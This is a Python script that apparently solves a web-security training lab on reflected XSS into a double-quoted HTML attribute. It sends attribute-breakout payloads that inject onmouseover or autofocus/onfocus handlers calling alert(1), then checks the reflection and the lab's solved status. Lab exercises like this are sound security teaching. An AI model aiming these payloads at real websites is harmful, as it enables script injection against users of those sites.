import argparse
import requests

# Reflected XSS into an attribute with angle brackets HTML-encoded. The search
# term is reflected inside a double-quoted HTML attribute. < and > are encoded, so
# a new tag can't be injected - but " is NOT encoded, so we break out of the
# attribute value and add an event-handler attribute. This script sends the
# payload and confirms the attribute breakout is reflected unescaped; the handler
# fires in a browser (hover for onmouseover, or use the autofocus/onfocus variant).

parser = argparse.ArgumentParser(description="Solve XSS lab 7 (reflected into attribute, angle brackets encoded)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default='"onmouseover="alert(1)',
                    help='Attribute-breakout payload (default needs hover; try \'" autofocus onfocus="alert(1)\')')
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# the payload breaks out of the double-quoted attribute value and injects an
# event handler; the server reflects it into the attribute without encoding the quote.
resp = requests.get(lab_url + "/", params={"search": args.payload})

# the reflection should contain our raw quote + event handler (not &quot; encoded)
if 'onmouseover="alert(1)' in resp.text or 'onfocus="alert(1)' in resp.text:
    print(f"[+] Attribute breakout reflected unescaped: {args.payload}")
    print("[+] The event handler fires in a browser (hover, or autofocus/onfocus auto-fires).")
else:
    print("[!] Breakout not found verbatim; the quote may be encoded or the context differs.")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - load the search in a browser and trigger the handler.")
